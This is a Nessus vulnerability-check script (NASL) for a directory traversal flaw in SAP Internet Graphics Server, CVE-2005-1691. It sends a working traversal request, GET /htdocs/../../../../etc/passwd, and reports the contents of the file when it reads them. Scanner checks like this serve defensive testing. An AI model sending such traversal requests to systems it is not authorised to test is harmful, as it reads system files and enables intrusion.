#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(19298);
 script_version ("$Revision: 1.7 $");

 script_cve_id("CVE-2005-1691"); 
 script_bugtraq_id(14369);
 script_xref(name:"OSVDB", value:"18255");

 script_name(english:"SAP Internet Graphics Server (IGS) Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is subject to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"It is possible to read arbitrary files on the remote host with the
privileges of the web server process by making a request such as :

	GET /htdocs/../../../../../../etc/passwd" );
 script_set_attribute(attribute:"see_also", value:"http://www.corsaire.com/advisories/c050503-001.txt" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-07/0413.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to SAP IGS version 6.40 Patch 11 or later as that reportedly
addresses the issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
 script_end_attributes();
 
 script_summary(english:"Attempts to read /etc/passwd");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

r = http_send_recv3(method:"GET", item:"/htdocs/../../../../../../../../../../../../../etc/passwd", port:port);
if (isnull(r)) exit(0);
res = r[2];

if (egrep(pattern:"root:.*:0:[01]:", string:res) )
{
  passwd = egrep(pattern:":.*:.*:.*:.*:", string:res);
  report = string(
    "Here are the contents of the file '/etc/passwd' that Nessus was\n",
    "able to read from the remote host :\n",
    "\n",
    passwd
  );
  security_warning(port:port, data:report);
}
